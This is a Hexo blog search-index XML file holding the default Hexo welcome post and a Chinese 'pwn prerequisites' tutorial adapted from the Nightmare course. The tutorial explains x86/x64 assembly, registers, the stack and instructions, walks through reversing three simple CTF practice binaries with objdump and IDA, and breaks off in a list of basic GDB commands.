<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hexo</title>
    <url>/2025/03/28/hello-world/</url>
    <content><![CDATA[<p>这是简介</p>
<span id="more"></span>
<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn前置知识</title>
    <url>/2025/03/29/%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<p>记录</p>
<span id="more"></span>
<p>本篇文章内容来自：<a href="https://github.com/guyinatuxedo/nightmare/tree/master">https://github.com/guyinatuxedo/nightmare/tree/master</a></p>
<h1 id="L3PbU">汇编</h1>
<h2 id="u4Mjm">Compiling  编译</h2>
首先，什么是汇编代码？汇编代码是处理器在计算机上实际运行的代码。例如，以一些 C 代码为例：

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">{</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Hello World!"</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>该代码未运行。事实是该代码被编译成汇编代码，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000001139 &lt;main&gt;:</span><br><span class="line">    1139:       55                      push   %rbp</span><br><span class="line">    113a:       48 89 e5                mov    %rsp,%rbp</span><br><span class="line">    113d:       48 8d 05 c0 0e 00 00    lea    0xec0(%rip),%rax        # 2004 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line">    1144:       48 89 c7                mov    %rax,%rdi</span><br><span class="line">    1147:       e8 e4 fe ff ff          call   1030 &lt;puts@plt&gt;</span><br><span class="line">    114c:       90                      nop</span><br><span class="line">    114d:       5d                      pop    %rbp</span><br><span class="line">    114e:       c3                      ret</span><br></pre></td></tr></table></figure>

<p>我们编写代码交给编译器，编译器会获取该代码并生成汇编代码，该汇编代码将完成 C 代码所要求的任何事情。汇编代码才是处理器上实际运行的代码。</p>
<p>汇编代码也有很多不同的架构。不同类型的处理器可以运行不同类型的汇编代码架构。我们在这里最常处理的是 64 位和 32 位 ELF（可执行和可链接格式）。我经常将这两种东西称为 x64 和 x86 。</p>
<h2 id="zkvlL">Registers  寄存器</h2>
寄存器本质上是处理器可以存储内存的地方。可以将它们视为处理器可以存储信息的存储桶。以下是 x64 寄存器的列表及其常见用例。

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rbp: 基址指针（Base Pointer），指向当前栈帧的底部</span><br><span class="line">rsp: 栈指针（Stack Pointer），指向当前栈帧的顶部</span><br><span class="line">rip: 指令指针（Instruction Pointer），指向待执行的下一条指令</span><br><span class="line"></span><br><span class="line">通用寄存器：</span><br><span class="line">这些寄存器可用于多种用途</span><br><span class="line">rax:</span><br><span class="line">rbx:</span><br><span class="line">rcx:</span><br><span class="line">rdx:</span><br><span class="line">rsi:</span><br><span class="line">rdi:</span><br><span class="line">r8:</span><br><span class="line">r9:</span><br><span class="line">r10:</span><br><span class="line">r11:</span><br><span class="line">r12:</span><br><span class="line">r13:</span><br><span class="line">r14:</span><br><span class="line">r15:</span><br></pre></td></tr></table></figure>

<p>在 x64 Linux 中，函数的参数通过寄存器传递。前几个参数通过这些寄存器传递：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rdi:    First Argument</span><br><span class="line">rsi:    Second Argument</span><br><span class="line">rdx:    Third Argument</span><br><span class="line">rcx:    Fourth Argument</span><br><span class="line">r8:     Fifth Argument</span><br><span class="line">r9:     Sixth Argument</span><br></pre></td></tr></table></figure>



<p>在 x86 elf 架构中，参数传递：</p>
<p>架构	                     前 6 个整数参数	                前 8 个浮点参数	       额外参数	               返回值</p>
<p>x86-64	         rdi, rsi, rdx, rcx, r8, r9	        xmm0 ~ xmm7	     栈（右→左）	   rax / xmm0</p>
<p>x86 (32-bit)	   全部通过栈（右→左）	           栈（右→左）   	     栈（右→左）	eax / st(0)（浮点）</p>
<p>寄存器有不同的大小。我们将要处理的典型大小是 8 字节、 4 字节、 2 字节和 1 。这些不同大小的原因是由于技术的进步，我们可以在寄存器中存储更多数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+-----------------+---------------+---------------+------------+</span><br><span class="line">| 8 Byte Register | Lower 4 Bytes | Lower 2 Bytes | Lower Byte |</span><br><span class="line">+-----------------+---------------+---------------+------------+</span><br><span class="line">|   rbp           |     ebp       |     bp        |     bpl    |</span><br><span class="line">|   rsp           |     esp       |     sp        |     spl    |</span><br><span class="line">|   rip           |     eip       |               |            |</span><br><span class="line">|   rax           |     eax       |     ax        |     al     |</span><br><span class="line">|   rbx           |     ebx       |     bx        |     bl     |</span><br><span class="line">|   rcx           |     ecx       |     cx        |     cl     |</span><br><span class="line">|   rdx           |     edx       |     dx        |     dl     |</span><br><span class="line">|   rsi           |     esi       |     si        |     sil    |</span><br><span class="line">|   rdi           |     edi       |     di        |     dil    |</span><br><span class="line">|   r8            |     r8d       |     r8w       |     r8b    |</span><br><span class="line">|   r9            |     r9d       |     r9w       |     r9b    |</span><br><span class="line">|   r10           |     r10d      |     r10w      |     r10b   |</span><br><span class="line">|   r11           |     r11d      |     r11w      |     r11b   |</span><br><span class="line">|   r12           |     r12d      |     r12w      |     r12b   |</span><br><span class="line">|   r13           |     r13d      |     r13w      |     r13b   |</span><br><span class="line">|   r14           |     r14d      |     r14w      |     r14b   |</span><br><span class="line">|   r15           |     r15d      |     r15w      |     r15b   |</span><br><span class="line">+-----------------+---------------+---------------+------------+</span><br></pre></td></tr></table></figure>

<p>在 x64 中，有 rax 、 eax 、 ax 和 al 寄存器。rax 指向完整的 8 。eax 只是 rax 寄存器的低四个字节。ax 是 rax 寄存器的最后 2 字节。最后 al 寄存器是 rax 寄存器的最后一个字节。</p>
<h2 id="szC5D">Words  字</h2>
一个字只是两个字节的数据。

<p>1位=1比特；1字节=8位；1字=2字节；1字=16位。</p>
<h2 id="Lyej3">Stacks  栈</h2>
栈，是最常见的内存区域之一，它是存储代码中的**局部变量**的地方。



<p>例如，在此代码中，变量 x 存储在栈中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void main(void)</span><br><span class="line">{</span><br><span class="line">    int x = 5;</span><br><span class="line">    puts("hi");</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>具体来说，我们可以看到它存储在栈上的 rbp-0x4 处。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000001135 &lt;main&gt;:</span><br><span class="line">    1135:       55                      push   rbp</span><br><span class="line">    1136:       48 89 e5                mov    rbp,rsp</span><br><span class="line">    1139:       48 83 ec 10             sub    rsp,0x10</span><br><span class="line">    113d:       c7 45 fc 05 00 00 00    mov    DWORD PTR [rbp-0x4],0x5</span><br><span class="line">    1144:       48 8d 3d b9 0e 00 00    lea    rdi,[rip+0xeb9]        # 2004 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line">    114b:       e8 e0 fe ff ff          call   1030 &lt;puts@plt&gt;</span><br><span class="line">    1150:       90                      nop</span><br><span class="line">    1151:       c9                      leave  </span><br><span class="line">    1152:       c3                      ret    </span><br><span class="line">    1153:       66 2e 0f 1f 84 00 00    nop    WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">    115a:       00 00 00</span><br><span class="line">    115d:       0f 1f 00                nop    DWORD PTR [rax]</span><br></pre></td></tr></table></figure>

<p>现在，栈上的值可以通过将它们推入栈或弹出栈来移动。这是从栈中添加或删除值的唯一方法（它是一种 LIFO 数据结构）。我们也可以引用栈上的值。</p>
<p>栈的确切边界由两个寄存器 rbp 和 rsp 记录。基指针 rbp 指向栈帧的底部。栈指针 rsp 指向栈帧的顶部。</p>
<h2 id="Mm92Y">flag 标志</h2>
在不同位数的CPU架构下，标志寄存器（FLAGS/EFLAGS/RFLAGS）的名称和宽度会发生变化，但其核心标志位（如ZF、CF等）的功能保持一致。



<p>EFLAGS 是一个 32 位寄存器，用作表示布尔值的位的集合，用于存储操作结果和处理器的状态。</p>
<p>以下是 32 个不同位的名称，其中，灰色框中的 0 和 1 是保留位，不应修改：</p>
<p><img src="https://github.com/Su1f4t3/MyPic/blob/main/img/flag.png?raw=true"></p>
<p>更多详细信息，如这些标志的不同用途请查看：<a href="https://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture#General-Purpose_Registers_(GPR)_-_16-bit_naming_conventions">https://en.wikibooks.org/wiki/X86_Assembly/X86_Architecture#General-Purpose_Registers_(GPR)_-_16-bit_naming_conventions</a></p>
<h2 id="q5RvI">Instructions  指令</h2>

<p><strong>mov</strong></p>
<p>mov 指令只是将数据从一个寄存器移动到另一个寄存器。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax, rdx</span><br></pre></td></tr></table></figure>

<p>这只会将数据从 rdx 寄存器移动到 rax 寄存器。</p>
<p><strong>dereference</strong></p>
<p>如果看到 [] 这样的括号，它们用于解引用，这涉及指针。指针是指向特定内存地址的值（它是内存地址，像是快递单号）。解引用是通过指针访问其指向内存中实际数据的过程，即“根据地址取数据”。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax, [rdx] </span><br></pre></td></tr></table></figure>

<p>将寄存器 rdx 中存储的内存地址处的值，复制到 rax 寄存器。</p>
<ul>
<li>rdx 中存有一个内存地址（如 0x1000）。</li>
<li>[rdx] 表示解引用，即访问地址 0x1000 处的数据（如数字 42）。</li>
<li>最终 rax 寄存器中存入值 42，而 rdx 的值（地址 0x1000）不变。</li>
</ul>
<p>另一方面：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov [rax], rdx </span><br></pre></td></tr></table></figure>

<p>将 rdx 寄存器中的值，写入寄存器 rax 中存储的内存地址处的值。</p>
<ul>
<li>rax 中存有一个内存地址（如 0x2000）。</li>
<li>[rax] 表示解引用，即操作地址 0x2000 处的内存。</li>
<li>将 rdx 的值（如 123）存入地址 0x2000，而 rax 的值（地址 0x2000）不变。</li>
</ul>
<p>指针不变性：</p>
<ul>
<li>解引用操作（[]）仅操作指针指向的数据，不会改变指针本身的值。</li>
<li>例如，mov [rax], rdx 执行后，rax 仍指向原地址，但该地址处的数据被更新。</li>
</ul>
<p><strong>lea</strong></p>
<p>lea 指令计算第二个操作数的地址，并将该地址移动到第一个操作数中。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lea rdi, [rbx+0x10]</span><br></pre></td></tr></table></figure>

<p>这会将地址 rbx+0x10 移动到 rdi 寄存器中。</p>
<p>对比 mov：</p>
<ul>
<li>若使用 mov rdi, [rbx+0x10]，会读取内存地址 0x1010 处的值到 rdi。</li>
<li>lea 仅计算地址，不涉及内存读写。</li>
</ul>
<p><strong>add</strong></p>
<p>这只是将两个值相加，并将总和存储在第一个参数中。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add rax, rdx</span><br></pre></td></tr></table></figure>

<p>这将使 rax 等于 rax + rdx</p>
<p><strong>sub</strong></p>
<p>该值将从第一个操作数中减去第二个操作数，并将差值存储在第一个参数中。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub rsp, 0x10</span><br></pre></td></tr></table></figure>

<p>行为：</p>
<ul>
<li>读取 rsp 寄存器的当前值（例如 0x7ffffff0）。</li>
<li>减去立即数 0x10（十六进制的 16）。</li>
<li>将结果（0x7fffffe0）存回 rsp 寄存器。</li>
</ul>
<p><strong>xor</strong></p>
<p>这将对给定的两个参数执行二元运算 xor，并将结果存储在第一个运算中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rdx, rax</span><br></pre></td></tr></table></figure>

<p>行为：</p>
<ul>
<li>逐位比较 rdx 和 rax 的值。</li>
<li>按异或规则生成结果。</li>
<li>将结果存入 rdx（覆盖原值）。</li>
</ul>
<p><strong>push</strong></p>
<p>push 指令将使栈增加 8 字节（对于 x64 ，对于 x86 为 4 ），然后将寄存器的内容推送到新的栈空间。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push rax</span><br></pre></td></tr></table></figure>

<p>这会使栈增加 8 字节，并且 rax 寄存器的内容将位于栈的顶部。</p>
<p><strong>pop</strong></p>
<p>pop 指令会将顶部 8 字节（对于 x64 为 4 ，对于 x86 为 4 个字节）弹出栈并放入参数中。然后它会缩小栈。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop rax</span><br></pre></td></tr></table></figure>

<p>栈顶部的 8 字节最终将位于 rax 寄存器中。</p>
<p><strong>jmp</strong></p>
<p>jmp 指令将跳转到某个指令地址。它用于重定向代码执行。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jmp 0x602010</span><br></pre></td></tr></table></figure>

<p>该指令将导致代码执行跳转到 0x602010 ，并执行那里的任何指令。</p>
<p><strong>call</strong></p>
<p>将下一条指令地址压入栈，再跳转执行。</p>
<p>两步操作：</p>
<ul>
<li>压入返回地址：将 call 下一条指令的地址（即 rip）压入栈。</li>
<li>跳转到目标地址：修改 rip 为指定的函数入口地址。</li>
</ul>
<p>等效于：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push rip</span><br><span class="line">jmp &lt;func&gt;</span><br></pre></td></tr></table></figure>



<p><strong>ret</strong></p>
<p>将保存的地址取出，跳转执行。</p>
<p>两步操作：</p>
<ol>
<li>弹出返回地址：从栈顶弹出之前保存的地址到 rip。</li>
<li>跳转执行：CPU 从该地址继续执行。</li>
</ol>
<p>等效于：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop rip</span><br></pre></td></tr></table></figure>



<p><strong>cmp</strong></p>
<p>cmp 指令与 sub 指令类似。只不过它不将结果存储在第一个参数中。它检查结果是小于零、大于零还是等于零。它会根据值相应地设置标志。</p>
<p><strong>jnz / jz</strong></p>
<p>此 jump if not zero 和 jump if zero ( jnz/jz ) 指令与跳转指令非常相似。不同之处在于它们只会根据标志 Zero Flag 的状态执行跳转。对于 jz ，它只会在设置 Zero Flag 时跳转。对于 jnz ，情况正好相反。</p>
<h1 id="tjprm">逆向汇编</h1>
这些是一些基本的汇编逆向问题，文件来自：

<ul>
<li><a href="https://github.com/kablaa/CTF-Workshop/blob/master/Reversing/Challenges/HelloWorld/hello_world">https://github.com/kablaa/CTF-Workshop/blob/master/Reversing/Challenges/HelloWorld/hello_world</a></li>
<li><a href="https://github.com/kablaa/CTF-Workshop/blob/master/Reversing/Challenges/IfThen/if_then">https://github.com/kablaa/CTF-Workshop/blob/master/Reversing/Challenges/IfThen/if_then</a></li>
<li><a href="https://github.com/kablaa/CTF-Workshop/blob/master/Reversing/Challenges/Loop/loop">https://github.com/kablaa/CTF-Workshop/blob/master/Reversing/Challenges/Loop/loop</a></li>
</ul>
<h2 id="pAIXt">hello_world</h2>
首先我们看一下汇编代码：

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$    objdump -D hello_world -M intel | less</span><br></pre></td></tr></table></figure>



<p>通过搜索字符串 main 来找到主函数后，我们看到以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">080483fb &lt;main&gt;:</span><br><span class="line"> 80483fb:       8d 4c 24 04             lea    ecx,[esp+0x4]</span><br><span class="line"> 80483ff:       83 e4 f0                and    esp,0xfffffff0</span><br><span class="line"> 8048402:       ff 71 fc                push   DWORD PTR [ecx-0x4]</span><br><span class="line"> 8048405:       55                      push   ebp</span><br><span class="line"> 8048406:       89 e5                   mov    ebp,esp</span><br><span class="line"> 8048408:       51                      push   ecx</span><br><span class="line"> 8048409:       83 ec 04                sub    esp,0x4</span><br><span class="line"> 804840c:       83 ec 0c                sub    esp,0xc</span><br><span class="line"> 804840f:       68 b0 84 04 08          push   0x80484b0</span><br><span class="line"> 8048414:       e8 b7 fe ff ff          call   80482d0 &lt;puts@plt&gt;</span><br><span class="line"> 8048419:       83 c4 10                add    esp,0x10</span><br><span class="line"> 804841c:       b8 00 00 00 00          mov    eax,0x0</span><br><span class="line"> 8048421:       8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4]</span><br><span class="line"> 8048424:       c9                      leave  </span><br><span class="line"> 8048425:       8d 61 fc                lea    esp,[ecx-0x4]</span><br><span class="line"> 8048428:       c3                      ret    </span><br><span class="line"> 8048429:       66 90                   xchg   ax,ax</span><br><span class="line"> 804842b:       66 90                   xchg   ax,ax</span><br><span class="line"> 804842d:       66 90                   xchg   ax,ax</span><br><span class="line"> 804842f:       90                      nop</span><br></pre></td></tr></table></figure>



<p>查看代码，我们看到对 puts 函数调用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push   0x80484b0</span><br><span class="line">call   80482d0 &lt;puts@plt&gt;</span><br></pre></td></tr></table></figure>



<p>浏览其余代码，我们确实没有看到太多有趣的东西。所以这段代码可能只是打印一个字符串。当我们运行二进制文件时，我们发现这是正确的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$    ./hello_world</span><br><span class="line">hello world!</span><br></pre></td></tr></table></figure>



<p>使用 IDA 查看伪代码，发现其和推理结果一致：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"hello world!"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>



<h2 id="AqlBE">if_then</h2>
首先我们看一下汇编代码：

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$    objdump -D if_then -M intel | less</span><br></pre></td></tr></table></figure>



<p>通过搜索字符串 main 来找到主函数后，我们看到以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">080483fb &lt;main&gt;:</span><br><span class="line"> 80483fb:       8d 4c 24 04             lea    ecx,[esp+0x4]</span><br><span class="line"> 80483ff:       83 e4 f0                and    esp,0xfffffff0</span><br><span class="line"> 8048402:       ff 71 fc                push   DWORD PTR [ecx-0x4]</span><br><span class="line"> 8048405:       55                      push   ebp</span><br><span class="line"> 8048406:       89 e5                   mov    ebp,esp</span><br><span class="line"> 8048408:       51                      push   ecx</span><br><span class="line"> 8048409:       83 ec 14                sub    esp,0x14</span><br><span class="line"> 804840c:       c7 45 f4 0a 00 00 00    mov    DWORD PTR [ebp-0xc],0xa</span><br><span class="line"> 8048413:       83 7d f4 0a             cmp    DWORD PTR [ebp-0xc],0xa</span><br><span class="line"> 8048417:       75 10                   jne    8048429 &lt;main+0x2e&gt;</span><br><span class="line"> 8048419:       83 ec 0c                sub    esp,0xc</span><br><span class="line"> 804841c:       68 c0 84 04 08          push   0x80484c0</span><br><span class="line"> 8048421:       e8 aa fe ff ff          call   80482d0 &lt;puts@plt&gt;</span><br><span class="line"> 8048426:       83 c4 10                add    esp,0x10</span><br><span class="line"> 8048429:       b8 00 00 00 00          mov    eax,0x0</span><br><span class="line"> 804842e:       8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4]</span><br><span class="line"> 8048431:       c9                      leave  </span><br><span class="line"> 8048432:       8d 61 fc                lea    esp,[ecx-0x4]</span><br><span class="line"> 8048435:       c3                      ret    </span><br><span class="line"> 8048436:       66 90                   xchg   ax,ax</span><br><span class="line"> 8048438:       66 90                   xchg   ax,ax</span><br><span class="line"> 804843a:       66 90                   xchg   ax,ax</span><br><span class="line"> 804843c:       66 90                   xchg   ax,ax</span><br><span class="line"> 804843e:       66 90                   xchg   ax,ax</span><br></pre></td></tr></table></figure>



<p>我们可以看到它将值 0xa 加载到 ebp-0xc 中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov    DWORD PTR [ebp-0xc],0xa</span><br></pre></td></tr></table></figure>



<p>紧接着，我们看到它运行了 cmp 指令来检查它是否相等。如果它们不相等，它将跳转到 main+0x2e 。由于它刚刚加载了值 0xa ，因此它不应该进行跳转：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmp    DWORD PTR [ebp-0xc],0xa</span><br><span class="line">jne    8048429 &lt;main+0x2e&gt;</span><br></pre></td></tr></table></figure>



<p>接下来它应该调用 puts：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub    esp,0xc</span><br><span class="line">push   0x80484c0</span><br><span class="line">call   80482d0 &lt;puts@plt&gt;</span><br></pre></td></tr></table></figure>



<p>因此，查看此代码后，我们发现它应该进行 puts 调用。运行它时，我们会看到它执行了以下操作：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$    ./if_then</span><br><span class="line">x = ten</span><br></pre></td></tr></table></figure>



<p>使用 IDA 查看伪代码，发现其和推理结果一致：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"x = ten"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>



<h2 id="uFTaI">loop</h2>
首先我们看一下汇编代码：

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$    objdump -D loop -M intel | less</span><br></pre></td></tr></table></figure>



<p>通过搜索字符串 main 来找到主函数后，我们看到以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">080483fb &lt;main&gt;:</span><br><span class="line"> 80483fb:       8d 4c 24 04             lea    ecx,[esp+0x4]</span><br><span class="line"> 80483ff:       83 e4 f0                and    esp,0xfffffff0</span><br><span class="line"> 8048402:       ff 71 fc                push   DWORD PTR [ecx-0x4]</span><br><span class="line"> 8048405:       55                      push   ebp</span><br><span class="line"> 8048406:       89 e5                   mov    ebp,esp</span><br><span class="line"> 8048408:       51                      push   ecx</span><br><span class="line"> 8048409:       83 ec 14                sub    esp,0x14</span><br><span class="line"> 804840c:       c7 45 f4 00 00 00 00    mov    DWORD PTR [ebp-0xc],0x0</span><br><span class="line"> 8048413:       eb 17                   jmp    804842c &lt;main+0x31&gt;</span><br><span class="line"> 8048415:       83 ec 08                sub    esp,0x8</span><br><span class="line"> 8048418:       ff 75 f4                push   DWORD PTR [ebp-0xc]</span><br><span class="line"> 804841b:       68 c0 84 04 08          push   0x80484c0</span><br><span class="line"> 8048420:       e8 ab fe ff ff          call   80482d0 &lt;printf@plt&gt;</span><br><span class="line"> 8048425:       83 c4 10                add    esp,0x10</span><br><span class="line"> 8048428:       83 45 f4 01             add    DWORD PTR [ebp-0xc],0x1</span><br><span class="line"> 804842c:       83 7d f4 13             cmp    DWORD PTR [ebp-0xc],0x13</span><br><span class="line"> 8048430:       7e e3                   jle    8048415 &lt;main+0x1a&gt;</span><br><span class="line"> 8048432:       b8 00 00 00 00          mov    eax,0x0</span><br><span class="line"> 8048437:       8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4]</span><br><span class="line"> 804843a:       c9                      leave  </span><br><span class="line"> 804843b:       8d 61 fc                lea    esp,[ecx-0x4]</span><br><span class="line"> 804843e:       c3                      ret    </span><br><span class="line"> 804843f:       90                      nop</span><br></pre></td></tr></table></figure>



<p>在这个函数中，我们可以看到它将位于 ebp-0xc 的栈变量初始化为 0 ，然后跳转到 0x804842c （ main+0x31 ）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov    DWORD PTR [ebp-0xc],0x0</span><br><span class="line">jmp    804842c &lt;main+0x31&gt;</span><br></pre></td></tr></table></figure>



<p>查看 0x804842c 处的指令，我们看到以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmp    DWORD PTR [ebp-0xc],0x13</span><br><span class="line">jle    8048415 &lt;main+0x1a&gt;</span><br></pre></td></tr></table></figure>

<p>我们看到它将地址 ebp-0xc 处的数据与 0x13 进行比较，如果小于或等于，则它将跳转到 0x8048415 ( 0x80483fb + 0x1a )。</p>
<p>查看 0x804842c 处的指令，这引出了 printf 调用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sub    esp,0x8</span><br><span class="line">push   DWORD PTR [ebp-0xc]</span><br><span class="line">push   0x80484c0</span><br><span class="line">call   80482d0 &lt;printf@plt&gt;</span><br></pre></td></tr></table></figure>

<p>它看起来像是以某种格式字符串打印出 ebp-0xc 的内容。</p>
<p>之后我们可以看到它增加了 ebp-0xc 的值，然后再次执行 cmp ：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add    DWORD PTR [ebp-0xc],0x1</span><br><span class="line">cmp    DWORD PTR [ebp-0xc],0x13</span><br></pre></td></tr></table></figure>



<p>总结一下， [ebp-0xc] 的初始值为 0 ，和 0x13 比较，如果小于或等于，就把值 printf 出来，然后加上 0x1 ，再和 0x13 比较，如此循环。</p>
<p>所以，我们可能正在看一个将运行 20 次并每次打印迭代计数器的 for 循环。看起来类似于以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int i = 0;</span><br><span class="line">for (i = 0; i &lt; 20; i ++)</span><br><span class="line">{</span><br><span class="line">    printf("%d", i);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>



<p>当我们运行二进制文件时，我们发现它是正确的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$    ./loop</span><br><span class="line">0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19</span><br></pre></td></tr></table></figure>



<p>使用 IDA 查看伪代码，发现其和推理结果一致：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>, i);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>



<h1 id="Qjloo">GDB调试</h1>
调试文件下载：[https://github.com/guyinatuxedo/nightmare/blob/master/modules/02-intro_tooling/gdb-gef/hello_world](https://github.com/guyinatuxedo/nightmare/blob/master/modules/02-intro_tooling/gdb-gef/hello_world)



<p>首先，gdb 是一个调试器（特别是 gnu 调试器），gef 是一个强大的 gdb 增强工具，提供了许多有用的功能来辅助二进制分析和漏洞利用开发。</p>
<h2 id="LQSgN">GDB基本命令</h2>

<ul>
<li>start - 开始调试，停在 main 函数入口</li>
<li>run / r - 运行程序</li>
<li>continue / c - 继续执行</li>
<li>stepi / si - 单步步入（进入函数调用）</li>
<li>nexti / ni - 单步步过（不进入函数调用）</li>
<li>break / b - 设置断点</li>
<li>b *0x地址 - 在指定地址设置断点</li>
<li>b 函数名 - 在函数入口设置断点</li>
<li>info breakpoints - 查看断点信息</li>
<li>delete / d - 删除断点</li>
</ul>
<h2 id="JogKi">内存操作</h2>

<ul>
<li>x/ - 检查内存</li>
<li>x/x 0x地址 - 以十六进制显示内存</li>
<li>x/s 0x地址 - 以字符串显示内存</li>
<li>x/i 0x地址 - 以指令显示内存</li>
<li>search-pattern - 在内存中搜索模式</li>
